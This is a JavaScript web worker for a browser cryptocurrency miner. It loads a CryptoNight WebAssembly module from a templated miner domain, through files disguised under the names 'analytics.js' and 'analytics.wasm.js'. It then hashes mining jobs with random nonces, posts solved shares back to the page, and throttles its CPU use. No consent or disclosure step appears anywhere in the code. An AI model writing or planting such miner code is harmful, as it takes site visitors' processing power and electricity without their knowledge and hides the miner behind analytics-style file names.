
try {
  if (typeof WebAssembly === "object" && typeof WebAssembly.instantiate === "function") {
    var module = new WebAssembly.Module(Uint8Array.of(0x0, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00));
    if (module instanceof WebAssembly.Module){
      if( 'function' === typeof importScripts) importScripts('%devoliosMiner_domain%/analytics.js');
      console.log("OK")
    } else {
      if( 'function' === typeof importScripts) importScripts('%devoliosMiner_domain%/analytics.wasm.js');
      console.log("WASM 1");
    }
  } else {
    if( 'function' === typeof importScripts) importScripts('%devoliosMiner_domain%/analytics.wasm.js');
    console.log("WASM 2");
  }
} catch (e) {
  if( 'function' === typeof importScripts) importScripts('%devoliosMiner_domain%/analytics.wasm.js');
  console.log("WASM 3");
}

var cn = Module.cwrap('hash_cn', 'string', ['string', 'string', 'number', 'number']);


function zeroPad(num, places) {
  var zero = places - num.toString().length + 1;
  return Array(+(zero > 0 && zero)).join("0") + num;
}

function hex2int(s) {
  return parseInt(s.match(/[a-fA-F0-9]{2}/g).reverse().join(''), 16);
}

function int2hex(i) {
  return (zeroPad(i.toString(16), 8)).match(/[a-fA-F0-9]{2}/g).reverse().join('');
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

onmessage = function (e) {
  var jbthrt = e.data;
  var job = jbthrt.job;
  var thrt = jbthrt.throttle;

  var bsuccess = false;
  var hash = "";
  var hexnonce = 0;

  var calcHash = function () {
    if (job !== null) {
      var target = hex2int(job.target);
      var inonce = getRandomInt(0, 0xFFFFFFFF);
      hexnonce = int2hex(inonce);
      try {
        if(job.algo === "cn")
        hash = cn(job.blob, hexnonce, 0, job.variant);
        else if(job.algo === "cn-lite")
        hash = cn(job.blob, hexnonce, 1, job.variant);
        else throw "algorithm not supported!";
        var hashval = hex2int(hash.substring(56, 64));
        bsuccess = hashval < target;
      }
      catch (err) { console.log(err); }
    }
  };

  var submit = function () {
    if (bsuccess) {
      var msg = {
        identifier: "solved",
        job_id: job.job_id,
        nonce: hexnonce,
        result: hash
      };
      postMessage(JSON.stringify(msg));
    } else {
      postMessage("nothing");
    }
  };

  if (thrt === 0) { calcHash(); submit(); }
  else {
    var t0 = performance.now();
    calcHash();
    var dt = performance.now() - t0;

    var sleept = Math.round(thrt / (100 - thrt + 10) * dt);
    setTimeout(submit, sleept);
  }
};
